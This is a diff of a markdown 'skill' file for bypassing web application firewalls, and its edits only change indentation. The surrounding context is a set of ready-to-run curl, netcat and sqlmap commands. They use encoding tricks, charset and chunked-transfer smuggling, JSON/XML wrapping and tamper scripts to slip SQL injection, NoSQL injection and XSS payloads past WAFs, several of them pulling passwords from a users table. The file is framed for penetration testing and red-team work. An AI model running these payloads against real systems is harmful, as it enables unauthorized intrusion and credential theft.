@@ -1,11 +1,11 @@
 ---
 name: performing-web-application-firewall-bypass
 description: Bypasses Web Application Firewall protections using encoding tricks,
-  HTTP method manipulation, parameter pollution, and payload obfuscation to smuggle
-  SQL injection, XSS, and other exploit payloads past WAF detection rules. Use when
-  a confirmed vulnerability is blocked by a WAF, during penetration tests or red
-  team engagements requiring bypass of perimeter security controls, or when evaluating
-  WAF rule effectiveness and bypass resistance.
+ HTTP method manipulation, parameter pollution, and payload obfuscation to smuggle
+ SQL injection, XSS, and other exploit payloads past WAF detection rules. Use when
+ a confirmed vulnerability is blocked by a WAF, during penetration tests or red
+ team engagements requiring bypass of perimeter security controls, or when evaluating
+ WAF rule effectiveness and bypass resistance.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -84,7 +84,7 @@ curl "http://target.com/page?id=1%u0027%u0020OR%u00201%u003D1--"
 
 # HTML entity encoding in body
 curl -X POST http://target.com/search \
-  -d "q=<script>alert&#40;1&#41;</script>"
+ -d "q=<script>alert&#40;1&#41;</script>"
 
 # Mixed case SQL keywords
 curl "http://target.com/page?id=1' UnIoN SeLeCt password FrOm users--"
@@ -113,12 +113,12 @@ printf "GET /page?id=1' OR 1=1-- \r\n" | nc target.com 80
 
 # Content-Type manipulation
 curl -X POST http://target.com/page \
-  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
-  -d "id=1' OR 1=1--"
+ -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
+ -d "id=1' OR 1=1--"
 
 # Multipart form data (may bypass body inspection)
 curl -X POST http://target.com/page \
-  -F "id=1' OR 1=1--"
+ -F "id=1' OR 1=1--"
 
 # Chunked Transfer-Encoding
 printf "POST /page HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nid=1\r\n11\r\n' OR 1=1--\r\n0\r\n\r\n" | nc target.com 80
@@ -138,18 +138,18 @@ curl "http://target.com/page?id=1'/*&q=*/UNION SELECT 1,2,3--"
 
 # JSON-based SQLi (many WAFs miss JSON payloads)
 curl -X POST http://target.com/api/query \
-  -H "Content-Type: application/json" \
-  -d '{"id": "1 AND 1=1 UNION SELECT password FROM users"}'
+ -H "Content-Type: application/json" \
+ -d '{"id": "1 AND 1=1 UNION SELECT password FROM users"}'
 
 # JSON SQL injection with operators
 curl -X POST http://target.com/api/search \
-  -H "Content-Type: application/json" \
-  -d '{"query": {"$gt":"", "$where":"1==1"}}'
+ -H "Content-Type: application/json" \
+ -d '{"query": {"$gt":"", "$where":"1==1"}}'
 
 # XML-wrapped payloads
 curl -X POST http://target.com/api/data \
-  -H "Content-Type: application/xml" \
-  -d "<data><id>1' UNION SELECT password FROM users--</id></data>"
+ -H "Content-Type: application/xml" \
+ -d "<data><id>1' UNION SELECT password FROM users--</id></data>"
 ```
 
 ### Step 5 — Use SQLMap Tamper Scripts
@@ -165,14 +165,14 @@ sqlmap -u "http://target.com/page?id=1" --tamper=chardoubleencode,between
 
 # Multiple tamper scripts combined
 sqlmap -u "http://target.com/page?id=1" \
-  --tamper=randomcase,space2comment,between,charunicodeencode \
-  --random-agent --level 5 --risk 3
+ --tamper=randomcase,space2comment,between,charunicodeencode \
+ --random-agent --level 5 --risk 3
 
 # Custom WAF bypass profile
 sqlmap -u "http://target.com/page?id=1" \
-  --tamper=space2comment,randomcase \
-  --delay=2 --random-agent \
-  --technique=B --batch
+ --tamper=space2comment,randomcase \
+ --delay=2 --random-agent \
+ --technique=B --batch
 ```
 
 ### Step 6 — XSS WAF Bypass Techniques
